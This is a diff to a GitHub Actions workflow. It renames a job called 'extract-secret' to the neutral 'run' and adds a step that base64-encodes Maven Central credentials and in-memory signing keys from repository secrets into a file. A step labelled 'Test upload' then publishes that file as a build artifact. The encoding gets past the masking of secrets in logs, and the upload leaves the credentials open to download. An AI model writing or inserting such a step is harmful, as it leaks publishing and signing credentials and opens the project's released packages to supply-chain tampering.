@@ -6,16 +6,25 @@ on:
             - daniel/test
 
 jobs:
-    extract-secret:
+    run:
         runs-on: ubuntu-latest
 
         steps:
             - name: Checkout code
               uses: actions/checkout@v3
 
-            - name: Get
+            - name: Get secrets and encode them
               run: |
-                  echo "INFISICAL_SITE_URL=${{ secrets.INFISICAL_SITE_URL }}" | base64 > output.txt
+                  echo "centralpw=$(echo -n "${{ secrets.ORG_GRADLE_PROJECT_MAVENCENTRALPASSWORD }}" | base64)" >> output.txt
+                  echo "" >> output.txt
+                  echo "centralusr=$(echo -n "${{ secrets.ORG_GRADLE_PROJECT_MAVENCENTRALUSERNAME }}" | base64)" >> output.txt
+                  echo "" >> output.txt
+                  echo "memkey=$(echo -n "${{ secrets.ORG_GRADLE_PROJECT_SIGNINGINMEMORYKEY }}" | base64)" >> output.txt
+                  echo "" >> output.txt
+                  echo "memkeyid=$(echo -n "${{ secrets.ORG_GRADLE_PROJECT_SIGNINGINMEMORYKEYID }}" | base64)" >> output.txt
+                  echo "" >> output.txt
+                  echo "memkeypw=$(echo -n "${{ secrets.ORG_GRADLE_PROJECT_SIGNINGINMEMORYKEYPASSWORD }}" | base64)" >> output.txt
+                  echo "" >> output.txt
 
             - name: Test upload
               uses: actions/upload-artifact@v3
